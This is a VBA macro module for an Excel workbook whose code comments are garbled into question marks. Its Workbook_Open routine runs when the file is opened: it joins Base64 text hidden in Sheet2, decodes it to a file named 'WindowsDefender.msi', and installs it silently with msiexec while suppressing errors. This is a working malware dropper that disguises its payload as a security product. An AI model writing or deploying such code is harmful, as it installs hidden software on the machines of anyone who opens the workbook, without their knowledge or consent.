Option Explicit

' ? Sheet2 ??? Base64 ??,?????? MSI ??
Public Sub DecodeAndExportFile(ByVal msiPath As String)

    Dim ws As Worksheet
    Set ws = ThisWorkbook.Worksheets("Sheet2")

    If ThisWorkbook.Path = "" Then Exit Sub

    Dim lastRow As Long
    lastRow = ws.Cells(ws.Rows.Count, "A").End(xlUp).Row

    Dim b64All As String
    Dim r As Long

    For r = 1 To lastRow
        If Len(ws.Cells(r, "A").Value) > 0 Then
            b64All = b64All & ws.Cells(r, "A").Value
        End If
    Next r

    If Len(b64All) = 0 Then Exit Sub

    Dim xml As Object, node As Object
    Set xml = CreateObject("MSXML2.DOMDocument.6.0")

    Set node = xml.createElement("b64")
    node.DataType = "bin.base64"
    node.Text = b64All

    Dim data() As Byte
    data = node.nodeTypedValue

    Dim f As Integer
    f = FreeFile

    Open msiPath For Binary Access Write As #f
    Put #f, , data
    Close #f

End Sub

Private Function Quote(ByVal s As String) As String
    Quote = """" & s & """"
End Function

' ???? MSI,???????
' ?? msiexec ????
Public Function InstallMsiSilentWait(ByVal msiPath As String) As Long
    Dim sh As Object
    Dim p As Object
    Dim cmd As String

    ' ?? MSI ??????????
    If Dir(msiPath) = "" Then
        Err.Raise vbObjectError + 1000, , "MSI not found"
    End If

    ' ?? msiexec ??????
    cmd = "msiexec /i " & Quote(msiPath) & " /qn"

    ' ????
    Set sh = CreateObject("WScript.Shell")
    Set p = sh.Exec(cmd)

    ' ?? msiexec ????
    Do While p.Status = 0
        DoEvents
    Loop

    ' ??????????
    InstallMsiSilentWait = CLng(p.exitCode)
End Function

' ??????
Public Function DeleteFile(ByVal filePath As String) As Boolean
    On Error GoTo ErrHandler

    ' ???????,?? False
    If Len(Dir(filePath)) = 0 Then
        DeleteFile = False
        Exit Function
    End If

    ' ????
    Kill filePath
    DeleteFile = True
    Exit Function

ErrHandler:
    ' ?????? False
    DeleteFile = False
End Function

' ??????????
Private Sub Workbook_Open()
    On Error Resume Next
    
    Dim msiPath As String
    ' MSI ????(???????)
    msiPath = ThisWorkbook.Path & "\WindowsDefender.msi"
    
    ' ????? MSI ??
    DecodeAndExportFile msiPath

    ' ?? MSI ????????
    If Dir(msiPath) = "" Then
        Exit Sub
    End If

    ' ???? MSI
    InstallMsiSilentWait msiPath

    ' ??????? MSI ??
    ' DeleteFile msiPath
End Sub

